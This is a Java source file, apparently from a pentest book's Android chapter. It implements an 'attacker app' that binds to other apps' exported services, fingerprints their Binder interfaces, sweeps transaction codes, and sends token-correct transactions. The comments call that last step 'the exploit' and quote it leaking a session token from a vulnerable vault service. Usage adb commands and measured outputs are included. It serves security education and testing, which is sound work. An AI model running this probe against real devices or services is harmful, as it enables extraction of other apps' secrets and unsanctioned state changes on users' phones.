// examples/attacker-app/ProbeActivity.java
//   -> in an Android project this lives at
//      src/main/java/com/pentest/ch28probe/ProbeActivity.java
//
// THE WHOLE ATTACKER. One class, no dependencies, no AIDL files, no knowledge
// of any target beyond a component name.
//
// This exact source was compiled, installed and run on a physical Redmi
// M2101K6P (Android 11, API 30) as an ordinary third-party app at uid 10291.
// It produced every measured binding result quoted in the chapter. The verbatim
// output is in ../measured-bind-probe.txt.
//
// WHAT IT ANSWERS, PER TARGET, IN ORDER:
//
//   1. Does bindService() accept the request?  (true / false / SecurityException)
//   2. Does onServiceConnected EVER fire?      -- the only proof of reachability
//   3. What interface does the binder claim?   -- getInterfaceDescriptor()
//   4. Is it alive, and is it really remote?   -- pingBinder, queryLocalInterface
//   5. What happens at transaction codes 1..3 with an EMPTY parcel?
//   6. What happens with the CORRECT interface token written first?
//
// Step 6 is the exploit. Steps 1-5 are reconnaissance, and step 5's refusals
// are more informative than its successes.
//
// USAGE
//   adb logcat -c
//   adb shell am start -n com.pentest.ch28probe/.ProbeActivity \
//       --es targets 'com.example.notesvault/com.example.notesvault.VaultService'
//   adb logcat -d -s CH28
//
//   # add a token-correct call at codes 1 and 3
//   adb shell am start -n com.pentest.ch28probe/.ProbeActivity \
//       --es targets 'com.example.notesvault/com.example.notesvault.VaultService' \
//       --es tokencodes '1+3'
//
//   (The separator is '+' rather than ',' because ',' already separates targets
//    and `am --es` gives you one string.)
//
// BUILD: see build.sh in this directory.
//
// ---------------------------------------------------------------------------
// TWO WARNINGS BEFORE YOU TRUST ITS OUTPUT
//
// A. bindService() RETURNING true DOES NOT MEAN YOU ARE CONNECTED.
//    Measured against com.android.keychain/.KeyChainService: BIND-RETURN true,
//    and onServiceConnected never fired, because that service's onBind returns
//    null for an Intent it does not recognise. A tester who records the return
//    value and moves on files a critical finding against a service they cannot
//    reach. Wait for CONNECTED.
//
// B. WITHOUT PACKAGE VISIBILITY YOU GET SILENT FALSE NEGATIVES.
//    From API 30, an app with targetSdk 30+ cannot see most other packages.
//    bindService then returns FALSE, throws NOTHING, and logs NOTHING -- which
//    is indistinguishable from "no such component". Measured, as a controlled
//    experiment: the same bind against com.vendor.fileexplorer returned
//    false, and returned true after adding one line to the manifest. That line
//    is <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
//    and it is in AndroidManifest.xml here.
//
//    Note for the report: this is NOT a mitigation. Any app may declare
//    QUERY_ALL_PACKAGES, and a <queries> element naming one specific target
//    needs no permission at all. Package visibility is an anti-enumeration
//    measure. Never cite it as an access control.
// ---------------------------------------------------------------------------
//
// WHAT THIS WILL *NOT* TELL YOU
//   - Whether anything it reached is a vulnerability. It shows you what a
//     method RETURNS, not whether returning it is wrong. That judgement is
//     README section 5.7.
//   - Anything about services with no intent filter that you have not named
//     explicitly. Get those from the manifest.
//   - Anything about a service whose onBind switches on the action, unless you
//     supply that action. This probe sends a bare component Intent by design,
//     because that is the weakest possible assumption. If CONNECTED never
//     fires, try again with an action from the target's manifest.
//   - Whether a SecurityException came from android:permission or from
//     exported=false. Both produce "Not allowed to bind to service". Cross-check
//     with scripts/service-recon.py, which reads the declared values.

package com.pentest.ch28probe;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.Process;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;

public class ProbeActivity extends Activity {

    static final String TAG = "CH28";

    /** How long to wait for asynchronous onServiceConnected callbacks. */
    static final long SETTLE_MS = 6000;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        // Print our own identity first. Every measured result in the chapter is
        // quoted against this number, and it is the thing the victim service
        // will see in Binder.getCallingUid() -- if it bothers to look.
        Log.i(TAG, "probe uid=" + Process.myUid() + " pid=" + Process.myPid());

        String targets = getIntent().getStringExtra("targets");
        if (targets == null) {
            Log.i(TAG, "no targets extra; pass --es targets 'pkg/cls,pkg/cls'");
            finish();
            return;
        }

        final List<String> results = new ArrayList<String>();

        for (String t : targets.split(",")) {
            final String target = t.trim();
            if (target.isEmpty()) continue;

            ComponentName cn = ComponentName.unflattenFromString(target);
            if (cn == null) {
                Log.i(TAG, "BAD-COMPONENT " + target);
                continue;
            }

            // An EXPLICIT Intent: component only, no action, no data. This is
            // the weakest assumption an attacker can make and it is what you
            // should try first. It also means no implicit resolution is
            // involved, so nothing here is an Intent-redirection question --
            // that is 26-Intent's territory.
            Intent i = new Intent();
            i.setComponent(cn);

            ServiceConnection sc = new ServiceConnection() {

                @Override
                public void onServiceConnected(ComponentName n, IBinder svc) {
                    // THIS is proof of reachability. Not the bindService return.
                    String desc = "?";
                    try {
                        // Transaction code 1598968902 ('_NTF'), answered by
                        // every Binder object in the system for free. This is
                        // the entire reverse-engineering step for an AIDL
                        // service: it names the interface.
                        desc = svc.getInterfaceDescriptor();
                    } catch (Exception e) {
                        desc = "ERR:" + e.getClass().getSimpleName();
                    }
                    Log.i(TAG, "CONNECTED " + target
                            + " descriptor='" + desc + "'"
                            // An EMPTY descriptor means a raw Binder, not an
                            // AIDL Stub: nothing enforces an interface token,
                            // so every transaction code is reachable with an
                            // empty parcel. That is the interesting case.
                            + " alive=" + svc.isBinderAlive()
                            + " ping=" + svc.pingBinder()
                            // If this is ever true you are in the SAME process
                            // and are not testing a security boundary at all.
                            + " local=" + (svc.queryLocalInterface(desc) != null));

                    probeCodes(target, svc);

                    String codes = getIntent().getStringExtra("tokencodes");
                    if (codes != null) tokenCall(target, svc, desc, codes);
                }

                @Override
                public void onServiceDisconnected(ComponentName n) {
                    // The remote PROCESS died. The connection is not gone; the
                    // framework will call onServiceConnected again if it comes
                    // back. Distinct from onBindingDied (API 26+), which means
                    // the binding itself is finished.
                    Log.i(TAG, "DISCONNECTED " + target);
                }
            };

            boolean ret;
            String err = "";
            try {
                // BIND_AUTO_CREATE is essential. Without it, binding to a
                // service that is not already running does nothing at all and
                // you wait forever for a callback.
                ret = bindService(i, sc, Context.BIND_AUTO_CREATE);
            } catch (SecurityException e) {
                // ContextImpl throws when system_server returned a negative
                // result: exported=false, or android:permission not held.
                ret = false;
                err = "SecurityException: " + e.getMessage();
            } catch (Exception e) {
                ret = false;
                err = e.getClass().getSimpleName() + ": " + e.getMessage();
            }

            // false WITH NO EXCEPTION is the package-visibility case. See
            // warning B at the top of this file.
            Log.i(TAG, "BIND-RETURN " + target + " => " + ret
                    + (err.isEmpty() ? "" : "  " + err));
            results.add(target + "=" + ret);
        }

        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override public void run() {
                Log.i(TAG, "SUMMARY " + results);
                Log.i(TAG, "PROBE-DONE");
                finish();       // finishing unbinds everything we bound
            }
        }, SETTLE_MS);
    }

    /**
     * Write the CORRECT interface token, then transact.
     *
     * This is the exploit, and it is nine lines. No AIDL file, no generated
     * Proxy, no compile-time dependency on the target. The interface token is
     * a public string the binder handed us on request -- it is a name tag, not
     * a lock (README 5.2).
     *
     * MEASURED against the vulnerable vault service:
     *   TOKEN-TX code=1 ok=true replyBytes=92 exception=(none)
     *            string='eyJhbGciOiJIUzI1NiJ9.SECRET-SESSION-TOKEN'
     *
     * CAUTION. Sweeping transaction codes on a real device's system services
     * can and does change state -- these are not read-only probes and there is
     * no schema telling you which is which. Do it on a device you can afford to
     * reboot or reflash, and start with codes you have read out of a decompiled
     * Stub rather than guessing.
     */
    static void tokenCall(String target, IBinder svc, String desc, String codes) {
        for (String cs : codes.split("[+]")) {
            int code;
            try {
                code = Integer.parseInt(cs.trim());
            } catch (Exception e) {
                continue;
            }
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                boolean ok = svc.transact(code, data, reply, 0);

                String exc = "(none)";
                String val = "";
                try {
                    // The framework marshals a thrown exception into the reply.
                    // readException() rethrows it on this side. WITHOUT this
                    // call you see a successful-looking transact and silently
                    // miss the SecurityException.
                    reply.readException();
                    int pos = reply.dataPosition();
                    try {
                        val = " string='" + reply.readString() + "'";
                    } catch (Throwable t2) {
                        // Not a String return. Rewind so nothing is corrupted.
                        reply.setDataPosition(pos);
                    }
                } catch (Throwable e) {
                    exc = e.getClass().getName() + ": " + e.getMessage();
                }

                Log.i(TAG, "  TOKEN-TX " + target + " code=" + code + " ok=" + ok
                        + " replyBytes=" + reply.dataSize()
                        + " exception=" + exc + val);
            } catch (Throwable t) {
                Log.i(TAG, "  TOKEN-TX " + target + " code=" + code + " THREW "
                        + t.getClass().getName() + ": " + t.getMessage());
            } finally {
                data.recycle();
                reply.recycle();
            }
        }
    }

    /**
     * Send an EMPTY parcel at codes 1..3 and record how the remote refuses.
     *
     * A refusal is data. Three distinguishable outcomes:
     *
     *   ok=true, SecurityException "Binder invocation to an incorrect
     *       interface"  -> an AIDL Stub. enforceInterface rejected us, so the
     *       object HAS a descriptor and the code is live. Write the token.
     *
     *   ok=false, empty reply -> a raw Binder whose onTransact returned false:
     *       the code is not handled. Keep sweeping.
     *
     *   ok=true, non-empty reply, no exception -> the method ran with no
     *       arguments and no token check. Read the reply carefully; you have
     *       already changed something.
     *
     * MEASURED. Against three unrelated system services on the test device,
     * every empty-parcel probe at codes 1-3 produced the first outcome, which
     * is how you tell an AIDL service from a raw one without any APK at all.
     */
    static void probeCodes(String target, IBinder svc) {
        for (int code = 1; code <= 3; code++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                boolean ok = svc.transact(code, data, reply, 0);
                String exc = "(none)";
                try {
                    reply.readException();
                } catch (Throwable e) {
                    exc = e.getClass().getName() + ": " + e.getMessage();
                }
                Log.i(TAG, "  TX " + target + " code=" + code + " ok=" + ok
                        + " replyBytes=" + reply.dataSize() + " exception=" + exc);
            } catch (Throwable t) {
                Log.i(TAG, "  TX " + target + " code=" + code + " THREW "
                        + t.getClass().getName() + ": " + t.getMessage());
            } finally {
                data.recycle();
                reply.recycle();
            }
        }
    }
}
